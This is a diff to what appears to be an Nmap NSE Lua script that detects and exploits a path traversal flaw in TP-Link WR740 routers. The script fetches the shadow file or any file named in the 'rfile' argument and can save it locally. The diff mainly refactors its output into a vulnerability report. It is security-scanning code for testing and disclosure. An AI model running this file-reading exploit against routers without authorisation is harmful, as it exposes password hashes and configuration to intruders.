@@ -47,7 +47,7 @@ end
 -- Checks if device is vulnerable by requesting the shadow file and looking for the pattern 'root:'
 ---
 local function check_vuln(host, port)
-  local evil_uri = TRAVERSAL_QRY..DEFAULT
+  local evil_uri = TRAVERSAL_QRY..DEFAULT_REMOTE_FILE
   stdnse.print_debug(1, "%s:HTTP GET %s", SCRIPT_NAME, evil_uri)
   local response = http.get(host, port, evil_uri)
   if response.body and response.status==200 and response.body:match("root:") then
@@ -66,40 +66,44 @@ action = function(host, port)
 
   filewrite = stdnse.get_script_args(SCRIPT_NAME..".outfile")
   rfile = stdnse.get_script_args(SCRIPT_NAME..".rfile") or DEFAULT_REMOTE_FILE
+
   local vuln = {
        title = 'Path traversal in TP-Link WR740 and possibly others',
        state = vulns.STATE.NOT_VULN, 
        description = [[
-TP-Link WR740 is vulnerable to a path traversal vulnerability. This vulnerability can be exploited with no authentication and gives attackers access to any file in the system.]],
+TP-Link WR740 and possibly others are vulnerable to a path traversal vulnerability in the URI "/help".
+This vulnerability can be exploited without authentication and gives attackers access to any file in the device including configuration files.]],
        references = {
            'http://websec.ca/advisories/'
        },
        dates = {
            disclosure = {year = '2012', month = '01', day = '1'},
        },
-     }
+  }
   local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
 
   local is_vulnerable = check_vuln(host, port)
   if is_vulnerable then
     vuln.state = vulns.STATE.EXPLOIT
+    response = http.get(host, port, TRAVERSAL_QRY..rfile)
     if response.body and response.status==200 then
       stdnse.print_debug(1, "%s", response.body)
       if response.body:match("Error") then
         stdnse.print_debug(1, "%s:[Error] File not found:%s", SCRIPT_NAME, rfile)
+        vuln.extra_info = string.format("%s not found.\n", rfile)
         return
       end
-      response = http.get(host, port, TRAVERSAL_QRY..rfile)
       local  _, _, rfile_content = string.find(response.body, 'SCRIPT>(.*)')
-      output_lines[#output_lines+1] = rfile.." :\n"..rfile_content
+      vuln.extra_info = rfile.." :\n"..rfile_content
       if filewrite then
         local status, err = write_file(filewrite,  rfile_content)
-      if status then
-        output_lines[#output_lines+1] = string.format("%s saved to %s\n", rfile, filewrite)
-      else
-        output_lines[#output_lines+1] = string.format("Error saving %s to %s: %s\n", rfile, filewrite, err)
+        if status then
+          vuln.extra_info = string.format("%s%s saved to %s\n", vuln.extra_info, rfile, filewrite)
+        else
+          vuln.extra_info = string.format("%sError saving %s to %s: %s\n", vuln.extra_info, rfile, filewrite, err)
+        end
       end
     end
-    return stdnse.strjoin("\n", output_lines)
+    return vuln_report:make_output(vuln)
   end
 end
